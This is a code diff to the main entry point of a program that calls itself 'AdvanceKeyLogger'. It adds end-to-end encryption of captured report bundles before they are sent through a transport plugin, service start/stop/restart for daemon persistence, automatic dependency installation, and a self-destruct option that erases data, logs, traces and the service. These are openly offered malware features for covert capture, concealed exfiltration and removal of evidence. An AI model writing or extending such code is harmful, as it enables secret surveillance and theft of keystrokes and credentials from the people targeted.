@@ -38,10 +38,13 @@ from storage.sqlite_storage import SQLiteStorage
 from transport import create_transport, list_transports
 from service import ServiceManager
 from utils.compression import gzip_data
+from crypto.protocol import E2EProtocol
 from utils.crypto import encrypt, generate_key, key_from_base64, key_to_base64
 from utils.logger_setup import setup_logging
 from utils.process import GracefulShutdown, PIDLock
 from utils.resilience import CircuitBreaker, TransportQueue
+from utils.dependency_check import check_and_install_dependencies
+from utils.self_destruct import execute_self_destruct
 from utils.system_info import get_system_info
 
 # Plugin modules are auto-imported by capture/__init__.py and
@@ -64,7 +67,7 @@ def parse_args() -> argparse.Namespace:
     service_parser = subparsers.add_parser("service", help="Manage service/daemon mode")
     service_parser.add_argument(
         "action",
-        choices=["install", "uninstall", "status"],
+        choices=["install", "uninstall", "start", "stop", "restart", "status"],
         help="Service action to perform",
     )
     parser.add_argument(
@@ -94,6 +97,11 @@ def parse_args() -> argparse.Namespace:
         "--list-transports",
         action="store_true",
         help="List registered transport plugins and exit",
+    )
+    parser.add_argument(
+        "--self-destruct",
+        action="store_true",
+        help="Remove all data, logs, and traces then exit",
     )
     parser.add_argument(
         "--dry-run",
@@ -233,10 +241,21 @@ def _apply_encryption(
     metadata: dict[str, str],
     config: dict[str, Any],
     data_dir: str,
+    e2e_protocol: E2EProtocol | None = None,
 ) -> tuple[bytes, dict[str, str]]:
     enc_cfg = config.get("encryption", {})
     if not enc_cfg.get("enabled", False):
         return payload, metadata
+
+    mode = str(enc_cfg.get("mode", "symmetric")).lower()
+    if mode == "e2e":
+        if e2e_protocol is None:
+            e2e_protocol = E2EProtocol(enc_cfg.get("e2e", {}))
+        encrypted = e2e_protocol.encrypt(payload)
+        meta = dict(metadata)
+        meta["filename"] = f"{meta.get('filename', 'report.bin')}.e2e"
+        meta["content_type"] = "application/json"
+        return encrypted, meta
 
     key = _load_encryption_key(config, data_dir)
     encrypted = encrypt(payload, key)
@@ -310,6 +329,12 @@ def main() -> int:
 
     logger.info("AdvanceKeyLogger starting...")
 
+    # --- Auto-install missing dependencies ---
+    if settings.get("general.auto_install_deps", False):
+        _installed, _failed = check_and_install_dependencies(auto_install=True)
+        if _installed:
+            logger.info("Auto-installed packages: %s", ", ".join(_installed))
+
     # --- Service management ---
     if args.command == "service":
         manager = ServiceManager(settings.as_dict())
@@ -318,6 +343,12 @@ def main() -> int:
             print(manager.install())
         elif action == "uninstall":
             print(manager.uninstall())
+        elif action == "start":
+            print(manager.start())
+        elif action == "stop":
+            print(manager.stop())
+        elif action == "restart":
+            print(manager.restart())
         elif action == "status":
             print(manager.status())
         else:
@@ -347,6 +378,31 @@ def main() -> int:
             print("Hint: Import transport modules to register them.")
         return 0
 
+    # --- Self-destruct ---
+    if args.self_destruct:
+        sd_config = settings.as_dict()
+        sd_cfg = sd_config.get("self_destruct", {})
+        secure_wipe = bool(sd_cfg.get("secure_wipe", False))
+        remove_svc = bool(sd_cfg.get("remove_service", True))
+        remove_prog = bool(sd_cfg.get("remove_program", False))
+
+        confirm = input(
+            "WARNING: This will permanently delete ALL data, logs, and traces.\n"
+            "Type 'YES' to confirm: "
+        )
+        if confirm.strip() != "YES":
+            print("Aborted.")
+            return 0
+
+        execute_self_destruct(
+            sd_config,
+            secure_wipe=secure_wipe,
+            remove_service=remove_svc,
+            remove_program=remove_prog,
+        )
+        print("Self-destruct complete.")
+        return 0
+
     # --- PID lock ---
     pid_lock = None
     if not args.no_pid_lock:
@@ -367,6 +423,19 @@ def main() -> int:
 
     # --- Create config snapshot ---
     config = settings.as_dict()
+
+    # --- Encryption setup ---
+    e2e_protocol = None
+    enc_cfg = config.get("encryption", {}) if isinstance(config, dict) else {}
+    if bool(enc_cfg.get("enabled", False)):
+        mode = str(enc_cfg.get("mode", "symmetric")).lower()
+        if mode == "e2e":
+            try:
+                e2e_protocol = E2EProtocol(enc_cfg.get("e2e", {}))
+                logger.info("E2E encryption enabled")
+            except Exception as exc:
+                logger.error("Failed to initialize E2E encryption: %s", exc)
+                return 1
 
     # --- Pipeline (optional) ---
     pipeline_enabled = bool(settings.get("pipeline.enabled", False))
@@ -620,7 +689,9 @@ def main() -> int:
                 continue
 
             payload, metadata, file_paths = _build_report_bundle(batch_items, config, sys_info)
-            payload, metadata = _apply_encryption(payload, metadata, config, data_dir)
+            payload, metadata = _apply_encryption(
+                payload, metadata, config, data_dir, e2e_protocol=e2e_protocol
+            )
 
             try:
                 success = transport.send(payload, metadata)
